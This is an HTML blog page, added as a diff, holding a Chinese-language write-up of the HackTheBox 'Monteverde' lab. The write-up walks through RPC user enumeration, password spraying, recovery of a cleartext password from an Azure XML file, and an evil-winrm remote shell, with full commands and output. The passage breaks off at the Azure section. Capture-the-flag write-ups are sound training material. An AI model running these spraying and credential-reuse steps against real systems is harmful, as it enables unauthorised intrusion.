@@ -1,0 +1,696 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HackTheBox-MonteverdeRecon:123456789101112131415161718192021222324252627282930313233343536373839# Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.17">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Monteverde">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Monteverde/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="HackTheBox-MonteverdeRecon:123456789101112131415161718192021222324252627282930313233343536373839# Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.17">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-06T11:30:34.869Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:33.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>HackTheBox-Monteverde - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Monteverde"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          82 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Monteverde</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="HackTheBox-Monteverde"><a href="#HackTheBox-Monteverde" class="headerlink" title="HackTheBox-Monteverde"></a>HackTheBox-Monteverde</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92SVN scan initiated Thu May 26 13:28:07 2022 as: nmap -sC -sV -Pn -p- -oA nmap.txt 10.10.10.172</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.172<br>Host is up (0.60s latency).<br>Not shown: 65516 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-26 05:37:52Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49674/tcp open  msrpc         Microsoft Windows RPC<br>49676/tcp open  msrpc         Microsoft Windows RPC<br>49693/tcp open  msrpc         Microsoft Windows RPC<br>49744/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>|_clock-skew: -1s<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-26T05:38:55<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://google.com/submit/ .<br><span class="hljs-comment"># Nmap done at Thu May 26 13:39:38 2022 -- 1 IP address (1 host up) scanned in 691.10 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>SMB是不允许匿名访问的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172          <br>[+] IP: 10.10.10.172:445	Name: 10.10.10.172 <br></code></pre></td></tr></table></figure>
+
+<p>那么只能从RPC下手：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N 10.10.10.172<br>rpcclient $&gt; <span class="hljs-built_in">exit</span><br>$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N 10.10.10.172 -c enumdomusers &gt; user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt     <br>user:[Guest] rid:[0x1f5]<br>user:[AAD_987d7f2f57d2] rid:[0x450]<br>user:[mhope] rid:[0x641]<br>user:[SABatchJobs] rid:[0xa2a]<br>user:[svc-ata] rid:[0xa2b]<br>user:[svc-bexec] rid:[0xa2c]<br>user:[svc-netapp] rid:[0xa2d]<br>user:[dgalanos] rid:[0xa35]<br>user:[roleary] rid:[0xa36]<br>user:[smorgan] rid:[0xa37]<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> user.txt | awk -F <span class="hljs-string">&quot;[&quot;</span>  <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; newuser.txt<br>$ <span class="hljs-built_in">cat</span> newuser.txt| awk -F <span class="hljs-string">&quot;]&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; exitusers.txt<br>$ <span class="hljs-built_in">cat</span> exitusers.txt                                       <br>Guest<br>AAD_987d7f2f57d2<br>mhope<br>SABatchJobs<br>svc-ata<br>svc-bexec<br>svc-netapp<br>dgalanos<br>roleary<br>smorgan<br></code></pre></td></tr></table></figure>
+
+<p>这样我就获取到了一个用户名字典。</p>
+<h4 id="SMB："><a href="#SMB：" class="headerlink" title="SMB："></a>SMB：</h4><p>继续在rpc搜索了一番，并没有找到任何密码， 我尝试对用户进行喷涂，就以收集到的用户名字典既当用户名亦当字典：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.172 -u user.txt -p user.txt --continue-on-success                   <br>SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)<br>&lt;skip&gt;..............................................<br>SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs<br><br></code></pre></td></tr></table></figure>
+
+<p>命中一个：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs<br>[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      <br>    Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	azure_uploads                                     	READ ONLY	<br>	C$                                                	NO ACCESS	Default share<br>	E$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	SYSVOL                                            	READ ONLY	Logon server share <br>	<span class="hljs-built_in">users</span>$                                            	READ ONLY<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span class="hljs-string">&#x27;azure_uploads&#x27;</span><br>[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	azure_uploads                                     	READ ONLY	<br>	.\azure_uploads\*<br>	dr--r--r--                0 Fri Jan  3 20:43:36 2020	.<br>	dr--r--r--                0 Fri Jan  3 20:43:36 2020	..<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span class="hljs-string">&#x27;users$&#x27;</span>       <br>[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	<span class="hljs-built_in">users</span>$                                            	READ ONLY	<br>	.\<span class="hljs-built_in">users</span>$\*<br>	dr--r--r--                0 Fri Jan  3 21:12:48 2020	.<br>	dr--r--r--                0 Fri Jan  3 21:12:48 2020	..<br>	dr--r--r--                0 Fri Jan  3 21:15:23 2020	dgalanos<br>	dr--r--r--                0 Fri Jan  3 21:41:18 2020	mhope<br>	dr--r--r--                0 Fri Jan  3 21:14:56 2020	roleary<br>	dr--r--r--                0 Fri Jan  3 21:14:28 2020	smorgan<br>	.\<span class="hljs-built_in">users</span>$\mhope\*<br>	dr--r--r--                0 Fri Jan  3 21:41:18 2020	.<br>	dr--r--r--                0 Fri Jan  3 21:41:18 2020	..<br>	fw--w--w--             1212 Fri Jan  3 22:59:24 2020	azure.xml<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient -U SABatchJobs //10.10.10.172/users$ SABatchJobs -c <span class="hljs-string">&#x27;get mhope/azure.xml azure.xml&#x27;</span><br>getting file \mhope\azure.xml of size 1212 as azure.xml (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)<br>$ <span class="hljs-built_in">cat</span> azure.xml           <br>��&lt;Objs Version=<span class="hljs-string">&quot;1.1.0.1&quot;</span> xmlns=<span class="hljs-string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;<br>  &lt;Obj RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;TN RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;<br>      &lt;T&gt;System.Object&lt;/T&gt;<br>    &lt;/TN&gt;<br>    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;<br>    &lt;Props&gt;<br>      &lt;DT N=<span class="hljs-string">&quot;StartDate&quot;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;<br>      &lt;DT N=<span class="hljs-string">&quot;EndDate&quot;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;<br>      &lt;G N=<span class="hljs-string">&quot;KeyId&quot;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;<br>      &lt;S N=<span class="hljs-string">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;<br>    &lt;/Props&gt;<br>  &lt;/Obj&gt;<br>&lt;/Objs&gt;   <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> 4n0therD4y@n0th3r$ &gt; passwd.txt<br>$ crackmapexec smb 10.10.10.172 -u mhope -p passwd.txt --continue-on-success|grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$                            <br>[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      <br>    Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	azure_uploads                                     	READ ONLY	<br>	C$                                                	NO ACCESS	Default share<br>	E$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	SYSVOL                                            	READ ONLY	Logon server share <br>	<span class="hljs-built_in">users</span>$                                            	READ ONLY<br></code></pre></td></tr></table></figure>
+
+<h4 id="WINRM"><a href="#WINRM" class="headerlink" title="WINRM:"></a>WINRM:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec winrm 10.10.10.172 -u mhope -p passwd.txt --continue-on-success|grep <span class="hljs-string">&#x27;[+]&#x27;</span><br>WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$ <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil-WinRM* PS C:\Users\mhope\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\mhope\desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---         1/3/2020   5:48 AM             32 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\mhope\desktop&gt; <span class="hljs-built_in">cat</span> user.txt<br>4961....................................<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\mhope\desktop&gt; ipconfig /all<br><br>Windows IP Configuration<br><br>   Host Name . . . . . . . . . . . . : MONTEVERDE<br>   Primary Dns Suffix  . . . . . . . : MEGABANK.LOCAL<br>   Node <span class="hljs-built_in">Type</span> . . . . . . . . . . . . : Hybrid<br>   IP Routing Enabled. . . . . . . . : No<br>   WINS Proxy Enabled. . . . . . . . : No<br>   DNS Suffix Search List. . . . . . : MEGABANK.LOCAL<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ bloodhound-python --zip -c All -u mhope -p 4n0therD4y@n0th3r$ -ns 10.10.10.172 -dc MONTEVERDE.MEGABANK.LOCAL -d MEGABANK.LOCAL<br>INFO: Found AD domain: megabank.local<br>INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Found 1 domains<br>INFO: Found 1 domains <span class="hljs-keyword">in</span> the forest<br>INFO: Found 1 computers<br>INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Found 13 <span class="hljs-built_in">users</span><br>INFO: Connecting to GC LDAP server: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Found 65 <span class="hljs-built_in">groups</span><br>INFO: Found 0 trusts<br>INFO: Starting computer enumeration with 10 workers<br>INFO: Querying computer: MONTEVERDE.MEGABANK.LOCAL<br>INFO: Done <span class="hljs-keyword">in</span> 00M 52S<br>INFO: Compressing output into 20220526142408_bloodhound.zip<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\mhope\desktop&gt; net user mhope<br>User name                    mhope<br>Full Name                    Mike Hope<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            1/2/2020 4:40:05 PM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          1/3/2020 4:40:05 PM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     No</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory               \\monteverde\users$\mhope</span><br><span class="hljs-string">Last logon                   1/3/2020 6:29:59 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Remote Management Use</span><br><span class="hljs-string">Global Group memberships     *Azure Admins         *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\mhope\desktop&gt; </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Azure："><a href="#Azure：" class="headerlink" title="Azure："></a>Azure：</h4><p>mhope是组Azure Admins成员。关于Azure，可学习：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.xpnsec.com<span class="hljs-regexp">/azuread-connect-for-redteam/</span><br></code></pre></td></tr></table></figure>
+
+<p>摘自以上原文：</p>
